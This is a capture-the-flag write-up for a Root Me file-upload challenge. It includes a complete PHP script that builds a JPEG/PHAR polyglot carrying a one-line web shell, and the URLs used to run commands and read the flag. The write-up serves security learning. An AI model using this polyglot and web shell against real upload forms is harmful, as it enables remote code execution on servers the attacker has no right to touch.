# Root Me: File Upload - Polyglot

**Objective:** Upload a disguised PHP shell to a photography site and execute it to retrieve the flag.
**Vulnerability:** File Upload Bypass via Polyglot (JPEG + PHAR).
**Technique:** Creating a file that is valid as both an Image (JPEG) and a PHP Archive (PHAR).

---

## 1. Reconnaissance

I analyzed the upload form on the main page.
* **Behavior:** It renames uploaded files to random strings (e.g., `phpjXNjfs.jpg`).
* **Filters:** It performs strict checks on both the file extension and the file content (Magic Bytes) to ensure it is a valid JPEG.

![[Pasted image 20251127062404.png]]
![[Pasted image 20251127062652.png]]
![[Pasted image 20251127062849.png]]

I also discovered an **Admin Interface** (`?page=admin`). The page explicitly mentions:
> "This is the admin interface where I can execute PHAR files to update my site."

![[Pasted image 20251127105053.png]]

---

## 2. Vulnerability Analysis

The challenge presents two conflicting constraints:
1.  **The Uploader:** Accepts only valid JPEGs.
2.  **The Admin Page:** Executes PHAR files.

**The Solution: A Polyglot File**
A polyglot is a file that is valid in multiple different file formats. I need to create a file that:
1.  Starts with JPEG Magic Bytes (`FF D8 FF...`) to trick the uploader.
2.  Contains a valid PHAR structure and the `__HALT_COMPILER();` stub to be executable by PHP.

---

## 3. Payload Generation

I used a PHP script to programmatically generate this polyglot file. The script creates a PHAR archive but forces its "Stub" (header) to look like a JPEG.

```php
<?php

$phar_file = 'exploit.phar';
$jpg_file  = 'exploit.jpg';

if (file_exists($phar_file)) unlink($phar_file);
if (file_exists($jpg_file)) unlink($jpg_file);

$phar = new Phar($phar_file);
$phar->startBuffering();

$phar->addFromString('shell.php', '<?php system($_GET["cmd"]); ?>');

$jpeg_header = "\xff\xd8\xff\xe0\x00\x10\x4a\x46\x49\x46\x00\x01\x01\x01\x00\x48\x00\x48\x00\x00\xff\xfe\x00\x13\x43\x72\x65\x61\x74\x65\x64\x20\x77\x69\x74\x68\x20\x47\x49\x4d\x50\xff\xdb\x00\x43\x00\x03\x02\x02\x03\x02\x02\x03\x03\x03\x03\x04\x03\x03\x04\x05\x08\x05\x05\x04\x04\x05\x0a\x07\x07\x06\x08\x0c\x0a\x0c\x0c\x0b\x0a\x0b\x0b\x0d\x0e\x12\x10\x0d\x0e\x11\x0e\x0b\x0b\x10\x16\x10\x11\x13\x14\x15\x15\x15\x0c\x0f\x17\x18\x16\x14\x18\x12\x14\x15\x14\xff\xd9";

$phar->setStub($jpeg_header . ' __HALT_COMPILER(); ?>');

$phar->stopBuffering();

rename($phar_file, $jpg_file);

echo "SUCCESS: Created $jpg_file. Upload this file!\n";
?>
```

## 4. Exploitation

### Step 1: Upload

I ran the script to generate `exploit.jpg` and uploaded it. The server accepted it because the magic bytes were correct.

**Uploaded location:** `uploads/phpjXNjfs.jpg`

![[Pasted image 20251127105423.png]]

### Step 2: Execution via Admin

I navigated to the admin interface. The admin script likely uses the `phar://` stream wrapper or `include()` to execute the update file.

I triggered the execution of the `shell.php` file _inside_ the JPG using the `phar` protocol (or by letting the admin page parse the PHAR structure).

**URL Trigger:** The error message confirms the server tried to include the file and executed the PHP code.

![[Pasted image 20251127105600.png]]

### Step 3: Command Injection

With the shell active, I injected system commands via the URL parameter `cmd`.

**List files:**

```
/?page=admin&cmd=ls -la
```

![[Pasted image 20251127105658.png]]

**Read Flag:**

```
/?page=admin&cmd=cat flag-juygaz36YyTFyT6R.txt
```

![[Pasted image 20251127105827.png]]

### Result

The flag was retrieved, And Lab is solved

![[Pasted image 20251127105910.png]]
